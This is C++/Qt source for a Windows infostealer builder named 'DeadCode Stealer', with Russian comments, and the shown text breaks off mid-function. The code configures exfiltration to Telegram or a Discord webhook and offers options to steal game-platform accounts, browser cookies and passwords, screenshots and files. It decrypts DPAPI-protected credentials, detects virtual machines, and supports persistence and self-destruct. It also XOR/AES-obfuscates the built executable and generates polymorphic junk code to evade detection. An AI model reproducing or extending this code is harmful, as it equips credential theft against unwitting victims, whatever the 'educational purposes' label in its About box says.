#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "build_key.h"
#include "polymorphic_code.h"
#include "junk_code.h"

#include <QMessageBox>
#include <QProcess>
#include <QFileDialog>
#include <QDateTime>
#include <QFile>
#include <QTextStream>
#include <QPropertyAnimation>
#include <QTimer>
#include <QDebug>
#include <QScreen>
#include <QPixmap>
#include <QJsonDocument>
#include <QJsonObject>
#include <QNetworkReply>
#include <QHttpMultiPart>
#include <QHostInfo>
#include <QSettings>
#include <QDir>
#include <QRegularExpression>
#include <QGuiApplication>
#include <QThread>
#include <QSysInfo>
#include <QClipboard>
#include <random>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <vector>
#include <string>
#include <fstream>
#include <windows.h>
#include <bcrypt.h>
#include <zip.h>
#include <sqlite3.h>
#include <curl/curl.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

// Определение глобальной переменной
MainWindow* g_mainWindow = nullptr;

// Функция для получения данных от libcurl
static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    s->append((char*)contents, newLength);
    return newLength;
}

// Реализация класса StealerWorker
class StealerWorker : public QObject {
    Q_OBJECT
public:
    StealerWorker(MainWindow* window, const std::string& tempDir) : window(window), tempDir(tempDir) {}

public slots:
    void process() {
        window->StealAndSendData(tempDir);
        emit finished();
    }

signals:
    void finished();

private:
    MainWindow* window;
    std::string tempDir;
};

// Удобный метод для вызова сигнала logUpdated
void MainWindow::emitLog(const QString& message) {
    QMutexLocker locker(&logMutex);
    QString timestamp = QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss");
    emit logUpdated("[" + timestamp + "] " + message);
}

// Реализация метода updateConfigFromUI
void MainWindow::updateConfigFromUI() {
    QMutexLocker locker(&logMutex); // Потокобезопасность

    config.sendMethod = sendMethodComboBox->currentText().toStdString();
    config.buildMethod = buildMethodComboBox->currentText().toStdString();
    config.telegramBotToken = tokenLineEdit->text().toStdString();
    config.telegramChatId = chatIdLineEdit->text().toStdString();
    config.discordWebhook = discordWebhookLineEdit->text().toStdString();
    config.filename = fileNameLineEdit->text().toStdString();
    config.iconPath = iconPathLineEdit->text().toStdString();

    // Обновление чекбоксов
    config.discord = discordCheckBox->isChecked();
    config.steam = steamCheckBox->isChecked();
    config.steamMAFile = steamMAFileCheckBox->isChecked();
    config.epic = epicCheckBox->isChecked();
    config.roblox = robloxCheckBox->isChecked();
    config.battlenet = battlenetCheckBox->isChecked();
    config.minecraft = minecraftCheckBox->isChecked();
    config.cookies = cookiesCheckBox->isChecked();
    config.passwords = passwordsCheckBox->isChecked();
    config.screenshot = screenshotCheckBox->isChecked();
    config.fileGrabber = fileGrabberCheckBox->isChecked();
    config.systemInfo = systemInfoCheckBox->isChecked();
    config.socialEngineering = socialEngineeringCheckBox->isChecked();
    config.chatHistory = chatHistoryCheckBox->isChecked();
    config.telegram = telegramCheckBox->isChecked();
    config.antiVM = antiVMCheckBox->isChecked();
    config.fakeError = fakeErrorCheckBox->isChecked();
    config.silent = silentCheckBox->isChecked();
    config.autoStart = autoStartCheckBox->isChecked();
    config.persist = persistCheckBox->isChecked();
    config.selfDestruct = selfDestructCheckBox->isChecked();
}

// Вспомогательная функция для расшифровки данных через DPAPI
QByteArray MainWindow::decryptDPAPIData(const QByteArray& encryptedData) {
    DATA_BLOB inBlob, outBlob;
    inBlob.pbData = (BYTE*)encryptedData.data();
    inBlob.cbData = encryptedData.size();

    if (CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
        QByteArray decryptedData((char*)outBlob.pbData, outBlob.cbData);
        LocalFree(outBlob.pbData);
        return decryptedData;
    } else {
        emitLog("Ошибка расшифровки DPAPI: " + QString::number(GetLastError()));
        return QByteArray();
    }
}

// Конструктор
MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
    , manager(new QNetworkAccessManager(this))
    , isBuilding(false)
    , buildTimer(new QTimer(this))
    , statusCheckTimer(new QTimer(this))
{
    ui->setupUi(this);
    g_mainWindow = this; // Инициализация глобальной переменной

    // Инициализация UI элементов
    tokenLineEdit = ui->tokenLineEdit;
    chatIdLineEdit = ui->chatIdLineEdit;
    discordWebhookLineEdit = ui->discordWebhookLineEdit;
    fileNameLineEdit = ui->fileNameLineEdit;
    iconPathLineEdit = ui->iconPathLineEdit;
    githubTokenLineEdit = ui->githubTokenLineEdit;     // Добавлено
    githubRepoLineEdit = ui->githubRepoLineEdit;       // Добавлено
    sendMethodComboBox = ui->sendMethodComboBox;
    buildMethodComboBox = ui->buildMethodComboBox;
    steamCheckBox = ui->steamCheckBox;
    steamMAFileCheckBox = ui->steamMAFileCheckBox;
    epicCheckBox = ui->epicCheckBox;
    robloxCheckBox = ui->robloxCheckBox;
    battlenetCheckBox = ui->battlenetCheckBox;
    minecraftCheckBox = ui->minecraftCheckBox;
    discordCheckBox = ui->discordCheckBox;
    telegramCheckBox = ui->telegramCheckBox;
    chatHistoryCheckBox = ui->chatHistoryCheckBox;
    cookiesCheckBox = ui->cookiesCheckBox;
    passwordsCheckBox = ui->passwordsCheckBox;
    screenshotCheckBox = ui->screenshotCheckBox;
    fileGrabberCheckBox = ui->fileGrabberCheckBox;
    systemInfoCheckBox = ui->systemInfoCheckBox;
    socialEngineeringCheckBox = ui->socialEngineeringCheckBox;
    antiVMCheckBox = ui->antiVMCheckBox;
    fakeErrorCheckBox = ui->fakeErrorCheckBox;
    silentCheckBox = ui->silentCheckBox;
    autoStartCheckBox = ui->autoStartCheckBox;
    persistCheckBox = ui->persistCheckBox;
    selfDestructCheckBox = ui->selfDestructCheckBox;
    textEdit = ui->textEdit;
    iconBrowseButton = ui->iconBrowseButton;
    buildButton = ui->buildButton;
    clearLogsButton = ui->clearLogsButton;             // Добавлено
    actionSaveConfig = ui->actionSaveConfig;
    actionLoadConfig = ui->actionLoadConfig;
    actionExportLogs = ui->actionExportLogs;
    actionExit = ui->actionExit;
    actionAbout = ui->actionAbout;

    // Инициализация значений по умолчанию
    sendMethodComboBox->addItems({"Local File", "Telegram", "Discord"});
    buildMethodComboBox->addItems({"Local Build", "GitHub Actions"}); // Добавлен GitHub Actions
    fileNameLineEdit->setText("DeadCode.exe");
    textEdit->setPlaceholderText("Logs will appear here...");

    // Загрузка сохранённых настроек
    QSettings settings("DeadCode", "Stealer");
    config.discordWebhook = settings.value("discordWebhook", "").toString().toStdString();
    config.selfDestruct = settings.value("selfDestruct", false).toBool();

    discordWebhookLineEdit->setText(QString::fromStdString(config.discordWebhook));
    selfDestructCheckBox->setChecked(config.selfDestruct);

    // Анимация для логотипа
    QPropertyAnimation *logoAnimation = new QPropertyAnimation(ui->logoLabel, "geometry", this);
    logoAnimation->setDuration(1500);
    logoAnimation->setStartValue(QRect(0, -150, 600, 150));
    logoAnimation->setEndValue(QRect(0, 0, 600, 150));
    logoAnimation->setEasingCurve(QEasingCurve::OutBounce);
    logoAnimation->start();

    // Анимация пульсации для кнопки "Собрать"
    QPropertyAnimation *buttonAnimation = new QPropertyAnimation(ui->buildButton, "size", this);
    buttonAnimation->setDuration(1000);
    buttonAnimation->setStartValue(QSize(100, 40));
    buttonAnimation->setKeyValueAt(0.5, QSize(120, 50));
    buttonAnimation->setEndValue(QSize(100, 40));
    buttonAnimation->setLoopCount(-1);
    buttonAnimation->setEasingCurve(QEasingCurve::InOutQuad);
    buttonAnimation->start();

    // Анимация появления секций
    animateSection(ui->gamingSectionLabel, ui->gamingSpacer);
    animateSection(ui->messengersSectionLabel, ui->messengersSpacer);
    animateSection(ui->browserSectionLabel, ui->browserSpacer);
    animateSection(ui->additionalSectionLabel, ui->additionalSpacer);
    animateSection(ui->stealthSectionLabel, ui->verticalSpacer);

    // Инициализация строки состояния
    ui->statusbar->showMessage("Готово", 0);

    // Подключение сигналов и слотов
    connect(ui->buildButton, &QPushButton::clicked, this, &MainWindow::on_buildButton_clicked);
    connect(ui->iconBrowseButton, &QPushButton::clicked, this, &MainWindow::on_iconBrowseButton_clicked);
    connect(ui->clearLogsButton, &QPushButton::clicked, this, &MainWindow::on_clearLogsButton_clicked); // Добавлено
    connect(ui->actionSaveConfig, &QAction::triggered, this, &MainWindow::saveConfig);
    connect(ui->actionLoadConfig, &QAction::triggered, this, &MainWindow::loadConfig);
    connect(ui->actionExportLogs, &QAction::triggered, this, &MainWindow::exportLogs);
    connect(ui->actionExit, &QAction::triggered, this, &QApplication::quit);
    connect(ui->actionAbout, &QAction::triggered, this, [this]() {
        QMessageBox::about(this, "О программе", "DeadCode Stealer\nВерсия 1.0\nСоздано для образовательных целей.\n\n© 2025");
    });
    connect(manager, &QNetworkAccessManager::finished, this, &MainWindow::replyFinished);
    connect(ui->sendMethodComboBox, &QComboBox::currentTextChanged, this, [this](const QString& text) {
        ui->statusbar->showMessage("Метод отправки: " + text, 0);
    });
    connect(this, &MainWindow::logUpdated, this, &MainWindow::appendLog);
    connect(this, &MainWindow::startStealSignal, this, &MainWindow::startStealProcess);
    connect(buildTimer, &QTimer::timeout, this, &MainWindow::buildExecutable);
    connect(statusCheckTimer, &QTimer::timeout, this, &MainWindow::checkBuildStatus); // Добавлено

    // Инициализация config начальными значениями
    updateConfigFromUI();
}

// Деструктор
MainWindow::~MainWindow() {
    config.selfDestruct = selfDestructCheckBox->isChecked();
    QSettings settings("DeadCode", "Stealer");
    settings.setValue("discordWebhook", QString::fromStdString(config.discordWebhook));
    settings.setValue("selfDestruct", config.selfDestruct);

    delete ui;
    delete manager;
    delete buildTimer;
    delete statusCheckTimer;
    g_mainWindow = nullptr;
}

// Анимация секций
void MainWindow::animateSection(QLabel* sectionLabel, QSpacerItem* spacer) {
    QWidget* parentWidget = sectionLabel->parentWidget();
    QVBoxLayout* layout = qobject_cast<QVBoxLayout*>(parentWidget->layout());
    if (!layout) return;

    QList<QWidget*> widgetsToAnimate;
    int startIndex = layout->indexOf(sectionLabel);
    int endIndex = spacer ? layout->indexOf(spacer) : layout->count();

    widgetsToAnimate.append(sectionLabel);
    for (int i = startIndex + 1; i < endIndex; ++i) {
        QLayoutItem* item = layout->itemAt(i);
        if (QWidget* widget = item->widget()) {
            if (dynamic_cast<QCheckBox*>(widget) || dynamic_cast<QComboBox*>(widget)) {
                widgetsToAnimate.append(widget);
            }
        }
    }

    for (QWidget* widget : widgetsToAnimate) {
        widget->setStyleSheet("opacity: 0;");
        widget->setMaximumHeight(0);
    }

    QParallelAnimationGroup* group = new QParallelAnimationGroup(this);
    for (QWidget* widget : widgetsToAnimate) {
        QPropertyAnimation* opacityAnimation = new QPropertyAnimation(widget, "windowOpacity");
        opacityAnimation->setDuration(500);
        opacityAnimation->setStartValue(0);
        opacityAnimation->setEndValue(1);
        opacityAnimation->setEasingCurve(QEasingCurve::OutCubic);

        QPropertyAnimation* heightAnimation = new QPropertyAnimation(widget, "maximumHeight");
        heightAnimation->setDuration(500);
        heightAnimation->setStartValue(0);
        heightAnimation->setEndValue(widget->sizeHint().height());
        heightAnimation->setEasingCurve(QEasingCurve::OutCubic);

        group->addAnimation(opacityAnimation);
        group->addAnimation(heightAnimation);
    }

    QTimer::singleShot(widgetsToAnimate.indexOf(sectionLabel) * 200, this, [group]() {
        group->start(QAbstractAnimation::DeleteWhenStopped);
    });
}

// Генерация случайной строки
std::string MainWindow::generateRandomString(size_t length) {
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
    std::string result;
    result.reserve(length);

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, sizeof(alphanum) - 2);

    for (size_t i = 0; i < length; ++i) {
        result += alphanum[dis(gen)];
    }

    return result;
}

// Генерация уникального XOR-ключа
std::string MainWindow::generateUniqueXorKey() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    std::stringstream ss;
    for (int i = 0; i < 16; ++i) {
        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);
    }
    return ss.str();
}

// Получение ключа шифрования
std::array<unsigned char, 16> MainWindow::GetEncryptionKey(bool useFirstKey) {
    std::string keyStr = useFirstKey ? encryptionKey1 : encryptionKey2;
    if (keyStr.empty()) {
        keyStr = generateRandomString(16);
        if (useFirstKey) encryptionKey1 = keyStr;
        else encryptionKey2 = keyStr;
    }
    std::array<unsigned char, 16> key;
    if (keyStr.length() >= 16) {
        for (size_t i = 0; i < 16; ++i) {
            key[i] = static_cast<unsigned char>(keyStr[i]);
        }
    } else {
        for (size_t i = 0; i < 16; ++i) {
            key[i] = static_cast<unsigned char>(keyStr[i % keyStr.length()]);
        }
    }
    return key;
}

// Генерация IV
std::array<unsigned char, 16> MainWindow::generateIV() {
    std::array<unsigned char, 16> iv;
    if (RAND_bytes(iv.data(), iv.size()) != 1) {
        emitLog("Ошибка: Не удалось сгенерировать IV для AES");
        std::fill(iv.begin(), iv.end(), 0);
    }
    return iv;
}

// Проверка на виртуальную машину
bool MainWindow::isRunningInVM() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[1024];
        DWORD size = sizeof(buffer);
        if (RegQueryValueExA(hKey, "SystemBiosVersion", nullptr, nullptr, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            std::string biosVersion(buffer);
            if (biosVersion.find("VMware") != std::string::npos || biosVersion.find("VirtualBox") != std::string::npos) {
                RegCloseKey(hKey);
                return true;
            }
        }
        RegCloseKey(hKey);
    }
    return false;
}

// Применение XOR-шифрования
QByteArray MainWindow::applyXOR(const QByteArray& data, const std::array<unsigned char, 16>& key) {
    QByteArray result = data;
    for (int i = 0; i < data.size(); ++i) {
        result[i] = data[i] ^ key[i % key.size()];
    }
    return result;
}

// Применение AES-шифрования
QByteArray MainWindow::applyAES(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv) {
    QByteArray result;
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    // Открытие алгоритма шифрования
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось открыть алгоритм AES: " + QString::number(status, 16));
        return QByteArray();
    }

    // Установка режима цепочки
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось установить режим цепочки: " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return QByteArray();
    }

    // Генерация ключа
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось сгенерировать ключ AES: " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return QByteArray();
    }

    // Шифрование данных
    DWORD bytesEncrypted = 0;
    DWORD resultSize = data.size() + 16; // Дополнительное место для padding
    std::vector<UCHAR> encryptedData(resultSize);

    status = BCryptEncrypt(hKey, (PUCHAR)data.data(), data.size(), nullptr, (PUCHAR)iv.data(), iv.size(),
                           encryptedData.data(), resultSize, &bytesEncrypted, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка шифрования AES: " + QString::number(status, 16));
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return QByteArray();
    }

    result = QByteArray((char*)encryptedData.data(), bytesEncrypted);

    // Освобождение ресурсов
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return result;
}

// Дешифрование данных
std::string MainWindow::decryptData(const std::string& encryptedData) {
    if (encryptedData.size() < 16) {
        emitLog("Ошибка: Данные слишком малы для дешифрования (нет IV)");
        return "";
    }

    // Извлекаем IV из первых 16 байт
    std::array<unsigned char, 16> iv;
    std::memcpy(iv.data(), encryptedData.data(), 16);

    // Оставшиеся данные — это зашифрованные данные
    QByteArray encryptedByteData(encryptedData.data() + 16, encryptedData.size() - 16);
    auto key1 = GetEncryptionKey(true);
    auto key2 = GetEncryptionKey(false);

    // Дешифрование AES
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось открыть алгоритм AES для дешифрования: " + QString::number(status, 16));
        return "";
    }

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось установить режим цепочки для дешифрования: " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key2.data(), (ULONG)key2.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось сгенерировать ключ AES для дешифрования: " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }

    DWORD bytesDecrypted = 0;
    DWORD resultSize = encryptedByteData.size();
    std::vector<UCHAR> decryptedData(resultSize);

    status = BCryptDecrypt(hKey, (PUCHAR)encryptedByteData.data(), encryptedByteData.size(), nullptr, (PUCHAR)iv.data(), iv.size(),
                           decryptedData.data(), resultSize, &bytesDecrypted, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка дешифрования AES: " + QString::number(status, 16));
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }

    QByteArray xorData((char*)decryptedData.data(), bytesDecrypted);

    // Дешифрование XOR
    QByteArray decryptedByteData = applyXOR(xorData, key1);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return std::string(decryptedByteData.constData(), decryptedByteData.size());
}

// Генерация ключей шифрования
void MainWindow::generateEncryptionKeys() {
    emitLog("Генерация ключей шифрования...");

    // Генерируем случайные ключи и соль
    const int keyLength = 32; // Длина ключа для AES-256
    const int saltLength = 16; // Длина соли

    std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, chars.size() - 1);

    // Генерация encryptionKey1
    std::string key1;
    for (int i = 0; i < keyLength; ++i) {
        key1 += chars[dis(gen)];
    }
    encryptionKey1 = key1;

    // Генерация encryptionKey2
    std::string key2;
    for (int i = 0; i < keyLength; ++i) {
        key2 += chars[dis(gen)];
    }
    encryptionKey2 = key2;

    // Генерация encryptionSalt
    std::string salt;
    for (int i = 0; i < saltLength; ++i) {
        salt += chars[dis(gen)];
    }
    encryptionSalt = salt;

    emitLog("Ключи шифрования сгенерированы: key1=" + QString::fromStdString(encryptionKey1) +
            ", key2=" + QString::fromStdString(encryptionKey2) +
            ", salt=" + QString::fromStdString(encryptionSalt));
}

// Обфускация исполняемого файла
void MainWindow::obfuscateExecutable(const std::string& exePath) {
    emitLog("Обфускация исполняемого файла: " + QString::fromStdString(exePath));

    std::ifstream inFile(exePath, std::ios::binary);
    if (!inFile.is_open()) {
        emitLog("Ошибка: Не удалось открыть исполняемый файл для обфускации");
        return;
    }

    std::vector<char> exeData((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    // Генерируем случайный ключ для обфускации
    std::array<unsigned char, 16> obfKey;
    if (RAND_bytes(obfKey.data(), obfKey.size()) != 1) {
        emitLog("Ошибка: Не удалось сгенерировать ключ для обфускации");
        return;
    }

    // Применяем XOR-обфускацию к данным
    for (size_t i = 0; i < exeData.size(); ++i) {
        exeData[i] ^= obfKey[i % obfKey.size()];
    }

    // Добавляем случайный мусор в конец файла
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1024, 4096); // Добавляем от 1 до 4 КБ мусора
    int junkSize = dis(gen);
    std::vector<char> junkData(junkSize);
    RAND_bytes((unsigned char*)junkData.data(), junkSize);

    // Записываем обфусцированные данные и мусор
    std::string obfPath = exePath + ".obf";
    std::ofstream outFile(obfPath, std::ios::binary);
    if (!outFile.is_open()) {
        emitLog("Ошибка: Не удалось создать обфусцированный файл");
        return;
    }

    outFile.write(exeData.data(), exeData.size());
    outFile.write(junkData.data(), junkData.size());
    outFile.close();

    // Переименовываем файл
    std::filesystem::rename(obfPath, exePath);
    emitLog("Исполняемый файл успешно обфусцирован: " + QString::fromStdString(exePath));
}

// Применение полиморфной обфускации
void MainWindow::applyPolymorphicObfuscation(const std::string& exePath) {
    emitLog("Применение полиморфной обфускации к исполняемому файлу: " + QString::fromStdString(exePath));

    // Читаем исполняемый файл
    std::ifstream inFile(exePath, std::ios::binary);
    if (!inFile.is_open()) {
        emitLog("Ошибка: Не удалось открыть исполняемый файл для полиморфной обфускации");
        return;
    }

    std::vector<char> exeData((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    // Генерируем случайный ключ для шифрования
    unsigned char key[32];
    if (RAND_bytes(key, sizeof(key)) != 1) {
        emitLog("Ошибка: Не удалось сгенерировать ключ для полиморфной обфускации");
        return;
    }

    // Инициализируем контекст шифрования (AES-256-CBC)
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        emitLog("Ошибка: Не удалось создать контекст шифрования для полиморфной обфускации");
        return;
    }

    unsigned char iv[16];
    if (RAND_bytes(iv, sizeof(iv)) != 1) {
        emitLog("Ошибка: Не удалось сгенерировать IV для полиморфной обфускации");
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key, iv) != 1) {
        emitLog("Ошибка: Не удалось инициализировать шифрование для полиморфной обфускации");
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    // Шифруем данные
    std::vector<unsigned char> encryptedData(exeData.size() + EVP_MAX_BLOCK_LENGTH);
    int outLen = 0;
    int totalLen = 0;

    if (EVP_EncryptUpdate(ctx, encryptedData.data(), &outLen, (unsigned char*)exeData.data(), exeData.size()) != 1) {
        emitLog("Ошибка: Не удалось выполнить шифрование для полиморфной обфускации");
        EVP_CIPHER_CTX_free(ctx);
        return;
    }
    totalLen += outLen;

    if (EVP_EncryptFinal_ex(ctx, encryptedData.data() + outLen, &outLen) != 1) {
        emitLog("Ошибка: Не удалось завершить шифрование для полиморфной обфускации");
        EVP_CIPHER_CTX_free(ctx);
        return;
    }
    totalLen += outLen;

    EVP_CIPHER_CTX_free(ctx);

    // Записываем зашифрованные данные
    std::string polyPath = exePath + ".poly";
    std::ofstream outFile(polyPath, std::ios::binary);
    if (!outFile.is_open()) {
        emitLog("Ошибка: Не удалось создать файл для полиморфной обфускации");
        return;
    }

    // Записываем IV и зашифрованные данные
    outFile.write((char*)iv, sizeof(iv));
    outFile.write((char*)encryptedData.data(), totalLen);
    outFile.close();

    // Переименовываем файл
    std::filesystem::rename(polyPath, exePath);
    emitLog("Полиморфная обфускация успешно применена: " + QString::fromStdString(exePath));
}

// Генерация полиморфного кода
std::string MainWindow::generatePolymorphicCode() {
    emitLog("Генерация полиморфного кода...");

    std::ofstream polyFile("polymorphic_code.h");
    if (!polyFile.is_open()) {
        emitLog("Ошибка: Не удалось создать polymorphic_code.h. Проверьте права доступа.");
        isBuilding = false;
        return "";
    }

    polyFile << "#ifndef POLYMORPHIC_CODE_H\n";
    polyFile << "#define POLYMORPHIC_CODE_H\n\n";
    polyFile << "#include <random>\n";
    polyFile << "#include <string>\n";
    polyFile << "#include <sstream>\n";
    polyFile << "#include <iomanip>\n";
    polyFile << "#include <chrono>\n";
    polyFile << "#include <thread>\n\n";
    polyFile << "// Этот файл перегенерируется динамически в mainwindow.cpp через generatePolymorphicCode()\n\n";

    polyFile << "inline int getRandomNumber(int min, int max) {\n";
    polyFile << "    static std::random_device rd;\n";
    polyFile << "    static std::mt19937 gen(rd());\n";
    polyFile << "    std::uniform_int_distribution<> dis(min, max);\n";
    polyFile << "    return dis(gen);\n";
    polyFile << "}\n\n";

    polyFile << "inline std::string generateRandomString(size_t length) {\n";
    polyFile << "    static const char alphanum[] =\n";
    polyFile << "        \"0123456789\"\n";
    polyFile << "        \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n";
    polyFile << "        \"abcdefghijklmnopqrstuvwxyz\";\n";
    polyFile << "    std::string result;\n";
    polyFile << "    result.reserve(length);\n";
    polyFile << "    for (size_t i = 0; i < length; ++i) {\n";
    polyFile << "        result += alphanum[getRandomNumber(0, sizeof(alphanum) - 2)];\n";
    polyFile << "    }\n";
    polyFile << "    return result;\n";
    polyFile << "}\n\n";

    polyFile << "inline std::string generateRandomFuncName() {\n";
    polyFile << "    static const char* prefixes[] = {\"polyFunc\", \"obfFunc\", \"cryptFunc\", \"hideFunc\", \"maskFunc\"};\n";
    polyFile << "    std::stringstream ss;\n";
    polyFile << "    ss << prefixes[getRandomNumber(0, 4)] << \"_\"\n";
    polyFile << "       << getRandomNumber(10000, 99999) << \"_\"\n";
    polyFile << "       << getRandomNumber(10000, 99999);\n";
    polyFile << "    return ss.str();\n";
    polyFile << "}\n\n";

    polyFile << "namespace Polymorphic {\n\n";

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(5, 10);
    int funcCount = dis(gen);
    std::vector<std::string> funcNames;
    for (int i = 0; i < funcCount; ++i) {
        std::string funcName;
        do {
            std::stringstream ss;
            ss << "polyFunc_" << std::setw(5) << std::setfill('0') << dis(gen) << "_" << std::setw(5) << std::setfill('0') << dis(gen);
            funcName = ss.str();
        } while (std::find(funcNames.begin(), funcNames.end(), funcName) != funcNames.end());
        funcNames.push_back(funcName);
        polyFile << "    inline void " << funcName << "() {\n";
        polyFile << "        volatile int dummy_" << dis(gen) << "_" << dis(gen) << " = getRandomNumber(1000, 15000);\n";
        polyFile << "        std::string noise = generateRandomString(getRandomNumber(5, 20));\n";
        polyFile << "        volatile int dummy2_" << dis(gen) << "_" << dis(gen) << " = dummy_" << dis(gen) << "_" << dis(gen) << " ^ noise.length();\n";
        polyFile << "        for (int i = 0; i < getRandomNumber(3, 15); i++) {\n";
        polyFile << "            if (dummy2_" << dis(gen) << "_" << dis(gen) << " % 2 == 0) {\n";
        polyFile << "                dummy2_" << dis(gen) << "_" << dis(gen) << " = (dummy2_" << dis(gen) << "_" << dis(gen) << " << getRandomNumber(1, 3)) ^ noise[i % noise.length()];\n";
        polyFile << "            } else {\n";
        polyFile << "                dummy2_" << dis(gen) << "_" << dis(gen) << " = (dummy2_" << dis(gen) << "_" << dis(gen) << " >> getRandomNumber(1, 2)) + getRandomNumber(10, 50);\n";
        polyFile << "            }\n";
        polyFile << "        }\n";
        polyFile << "        std::this_thread::sleep_for(std::chrono::milliseconds(getRandomNumber(1, 10)));\n";
        polyFile << "    }\n\n";
    }

    polyFile << "    inline void executePolymorphicCode() {\n";
    for (const auto& funcName : funcNames) {
        polyFile << "        " << funcName << "();\n";
    }
    polyFile << "    }\n\n";

    polyFile << "} // namespace Polymorphic\n\n";
    polyFile << "#endif // POLYMORPHIC_CODE_H\n";

    polyFile.close();
    emitLog("Полиморфный код сгенерирован в polymorphic_code.h");

    // Возвращаем сгенерированный код как строку для использования в compileBuild
    std::stringstream polyCode;
    polyCode << "#include \"polymorphic_code.h\"\n";
    polyCode << "void runPolymorphicCode() {\n";
    polyCode << "    Polymorphic::executePolymorphicCode();\n";
    polyCode << "}\n";
    return polyCode.str();
}

// Генерация заголовочного файла ключей
void MainWindow::generateBuildKeyHeader(const std::string& encryptionKey) {
    emitLog("Генерация заголовочного файла ключей...");

    std::ofstream keyFile("build_key.h");
    if (!keyFile.is_open()) {
        emitLog("Ошибка: Не удалось создать build_key.h. Проверьте права доступа.");
        isBuilding = false;
        return;
    }

    keyFile << "#ifndef BUILD_KEY_H\n";
    keyFile << "#define BUILD_KEY_H\n\n";
    keyFile << "#include <array>\n";
    keyFile << "#include <string>\n";
    keyFile << "#include <sstream>\n";
    keyFile << "#include <iomanip>\n";
    keyFile << "#include <random>\n";
    keyFile << "#include <cstring>\n\n";
    keyFile << "// Этот файл генерируется автоматически в mainwindow.cpp через generateBuildKeyHeader()\n\n";

    keyFile << "const std::string ENCRYPTION_KEY_1 = \"" << encryptionKey1 << "\";\n";
    keyFile << "const std::string ENCRYPTION_KEY_2 = \"" << encryptionKey2 << "\";\n";
    keyFile << "const std::string ENCRYPTION_SALT = \"" << encryptionSalt << "\";\n";
    keyFile << "const std::string BUILD_ENCRYPTION_KEY = \"" << encryptionKey << "\";\n\n";

    keyFile << "inline std::array<unsigned char, 16> GenerateUniqueKey() {\n";
    keyFile << "    std::array<unsigned char, 16> key;\n";
    keyFile << "    std::random_device rd;\n";
    keyFile << "    std::mt19937 gen(rd());\n";
    keyFile << "    std::uniform_int_distribution<> dis(0, 255);\n";
